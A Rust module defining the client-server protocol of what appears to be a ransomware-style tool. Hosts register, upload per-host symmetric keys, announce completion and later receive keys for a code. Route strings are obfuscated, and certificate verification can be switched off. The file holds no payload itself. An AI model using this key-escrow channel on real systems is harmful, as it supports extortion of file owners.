#![allow(clippy::missing_panics_doc)]

pub mod structs {
    use serde::{Deserialize, Serialize};

    #[derive(Serialize, Deserialize, Debug)]
    pub struct Registration {
        pub id: String,
        pub hostname: String,
        pub proof: String,
    }

    #[derive(Serialize, Deserialize, Debug)]
    pub struct UploadSymKey {
        pub id: String,
        pub key: String,
        pub proof: String,
    }

    #[derive(Serialize, Deserialize, Debug)]
    pub struct AnnounceCompletion {
        pub id: String,
        pub proof: String,
    }

    #[derive(Serialize, Deserialize, Debug)]
    pub struct DownloadSymKey {
        pub id: String,
        pub code: String,
        pub proof: String,
    }
}

pub mod codes {
    pub const RECOVERY_REQUEST_CODE: &str = "0000-0000-0000-0000";
}

pub mod routes {
    use std::sync::LazyLock;

    pub static REGISTER: LazyLock<String> = LazyLock::new(|| lc!("/register"));
    pub static UPLOAD_SYM_KEY: LazyLock<String> = LazyLock::new(|| lc!("/upload-sym-key"));
    pub static ANNOUNCE_COMPLETION: LazyLock<String> =
        LazyLock::new(|| lc!("/announce-completion"));
    pub static DOWNLOAD_SYM_KEY: LazyLock<String> = LazyLock::new(|| lc!("/download-sym-key"));
    pub static DOWNLOAD_DIR: LazyLock<String> = LazyLock::new(|| lc!("/download"));
    pub static ASYM_PUB_KEY_PATH: LazyLock<String> =
        LazyLock::new(|| lc!("/download/asym-pub-key.pem"));
}

pub mod client {
    use log::debug;
    use std::{sync::LazyLock, time::Duration};
    use ureq::{
        Agent,
        tls::{Certificate, RootCerts, TlsConfig},
    };

    use crate::web::{
        client_tls::get_ca_public_key,
        ureq_client::{web_get_recv_bytes_ureq, web_post_send_json_recv_text_ureq},
    };

    fn create_agent(verify_server: bool) -> Agent {
        let tls_config = if verify_server {
            debug!("Creating web client with server certificate verification");
            let ca_cert = Certificate::from_pem(&get_ca_public_key())
                .expect("Failed to parse embedded CA certificate");
            TlsConfig::builder()
                .root_certs(RootCerts::new_with_certs(&[ca_cert]))
                .build()
        } else {
            debug!("Creating web client without server certificate verification");
            TlsConfig::builder().disable_verification(true).build()
        };

        Agent::config_builder()
            .tls_config(tls_config)
            .timeout_global(Some(Duration::from_secs(30)))
            .timeout_connect(Some(Duration::from_secs(10)))
            .build()
            .into()
    }

    static AGENT_VERIFY: LazyLock<Agent> = LazyLock::new(|| create_agent(true));
    static AGENT_NO_VERIFY: LazyLock<Agent> = LazyLock::new(|| create_agent(false));

    fn agent(verify_server: bool) -> &'static Agent {
        if verify_server {
            &AGENT_VERIFY
        } else {
            &AGENT_NO_VERIFY
        }
    }

    #[must_use]
    pub fn web_get_recv_bytes(url: &str, verify_server: bool) -> Option<Vec<u8>> {
        web_get_recv_bytes_ureq(agent(verify_server), url)
    }

    pub fn web_post_send_json_recv_text<T: serde::Serialize>(
        url: &str,
        json: &T,
        verify_server: bool,
    ) -> Option<String> {
        web_post_send_json_recv_text_ureq(agent(verify_server), url, json)
    }
}

pub mod server_tls {
    use rust_embed::RustEmbed;
    use std::borrow::Cow;
    #[derive(RustEmbed)]
    #[folder = "assets/cert"]
    #[include = "cert.pem"]
    #[include = "key.pem"]
    struct AssetCertPriv;

    #[must_use]
    pub fn get_tls_public_key() -> Cow<'static, [u8]> {
        AssetCertPriv::get("cert.pem")
            .expect("Failed to get public key file")
            .data
    }

    #[must_use]
    pub fn get_tls_private_key() -> Cow<'static, [u8]> {
        AssetCertPriv::get("key.pem")
            .expect("Failed to get private key file")
            .data
    }
}

pub mod client_tls {
    use rust_embed::RustEmbed;
    use std::borrow::Cow;
    #[derive(RustEmbed)]
    #[folder = "assets/cert"]
    #[include = "ca-cert.pem"]
    struct AssetCertPub;

    #[must_use]
    pub fn get_ca_public_key() -> Cow<'static, [u8]> {
        AssetCertPub::get("ca-cert.pem")
            .expect("Failed to get public key file")
            .data
    }
}

pub mod validate {
    use hex::{decode, encode};
    use purecrypto::hash::HmacSha256;
    use regex::Regex;
    use std::sync::LazyLock;

    static ID_REGEX: LazyLock<Regex> =
        LazyLock::new(|| Regex::new(r"^[[:alnum:]]{16}$").expect("Invalid Regex"));
    static HOSTNAME_REGEX: LazyLock<Regex> =
        LazyLock::new(|| Regex::new(r"^[0-9A-Za-z.\-]{1,32}$").expect("Invalid Regex"));
    static SHA256_REGEX: LazyLock<Regex> =
        LazyLock::new(|| Regex::new(r"^[a-fA-F0-9]{64}$").expect("Invalid Regex"));
    static CODE_REGEX: LazyLock<Regex> = LazyLock::new(|| {
        Regex::new(r"^[[:alnum:]]{4}-[[:alnum:]]{4}-[[:alnum:]]{4}-[[:alnum:]]{4}$")
            .expect("Invalid Regex")
    });
    static CODE_SEGMENT_REGEX: LazyLock<Regex> =
        LazyLock::new(|| Regex::new(r"^[[:alnum:]]{4}$").expect("Invalid Regex"));

    #[must_use]
    pub fn validate_id(id: &str) -> bool {
        ID_REGEX.is_match(id)
    }

    #[must_use]
    pub fn validate_hostname(hostname: &str) -> bool {
        HOSTNAME_REGEX.is_match(hostname)
    }

    #[must_use]
    pub fn validate_proof(proof: &str) -> bool {
        SHA256_REGEX.is_match(proof)
    }

    #[must_use]
    pub fn validate_key(key: &str) -> bool {
        let len = key.len();
        (128..=1024).contains(&len)
            && len.is_multiple_of(2)
            && key.bytes().all(|b| b.is_ascii_hexdigit())
    }

    #[must_use]
    pub fn validate_code_segment(code_segment: &str) -> bool {
        CODE_SEGMENT_REGEX.is_match(code_segment)
    }

    #[must_use]
    pub fn validate_code(code: &str) -> bool {
        CODE_REGEX.is_match(code)
    }

    #[must_use]
    pub fn create_proof(proof_source: &[u8], secret: &str) -> String {
        let tag = HmacSha256::mac(secret.as_bytes(), proof_source);
        encode(tag.as_ref())
    }

    #[must_use]
    pub fn decode_hex<const N: usize>(hex_str: &str) -> Option<[u8; N]> {
        let bytes = decode(hex_str).ok()?;
        bytes.try_into().ok()
    }

    #[must_use]
    pub fn check_proof(proof_source: &[u8], secret: &str, proof: &str) -> bool {
        let Ok(expected) = decode(proof) else {
            return false;
        };
        bool::from(
            HmacSha256::new(secret.as_bytes())
                .chain(proof_source)
                .verify(&expected),
        )
    }
}

mod ureq_client {
    use log::{debug, error, warn};
    use std::{thread::sleep, time::Duration};
    use ureq::Agent;

    const RETRIES: u8 = 5;
    const INITIAL_RETRY_WAIT_SECS: u64 = 10;
    const MAX_RETRY_WAIT_SECS: u64 = 120;

    fn retry_with_backoff<T, F>(label: &str, mut attempt: F) -> Option<T>
    where
        F: FnMut() -> Result<T, ureq::Error>,
    {
        let mut retry_wait = INITIAL_RETRY_WAIT_SECS;
        for attempt_no in 1..=RETRIES {
            match attempt() {
                Ok(value) => return Some(value),
                Err(ureq::Error::StatusCode(error)) => {
                    error!("Server rejected {label}: {error:?} - not retrying");
                    return None;
                }
                Err(
                    error @ (ureq::Error::BadUri(_) | ureq::Error::Http(_) | ureq::Error::Json(_)),
                ) => {
                    error!("Invalid {label} request, not retrying: {error:?}");
                    return None;
                }
                Err(error) => {
                    warn!("Failed to receive server response to {label}: {error:?}");
                    if attempt_no >= RETRIES {
                        return None;
                    }
                    warn!("Sleeping for {retry_wait} seconds before retrying");
                    sleep(Duration::from_secs(retry_wait));
                    retry_wait = retry_wait.saturating_mul(2).min(MAX_RETRY_WAIT_SECS);
                }
            }
        }
        None
    }

    pub fn web_get_recv_bytes_ureq(agent: &Agent, url: &str) -> Option<Vec<u8>> {
        retry_with_backoff("GET", || {
            let response = agent.get(url).call()?;
            debug!("Received server response to GET: {response:?}");
            let bytes = response.into_body().read_to_vec()?;
            debug!(
                "Successfully read {} content bytes from response",
                bytes.len()
            );
            Ok(bytes)
        })
    }

    pub fn web_post_send_json_recv_text_ureq<T: serde::Serialize>(
        agent: &Agent,
        url: &str,
        json: &T,
    ) -> Option<String> {
        retry_with_backoff("POST", || {
            let mut response = agent.post(url).send_json(json)?;
            debug!("Received server response to POST: {response:?}");
            let text = response.body_mut().read_to_string()?;
            debug!("Successfully read content text from response: {text}");
            Ok(text)
        })
    }
}
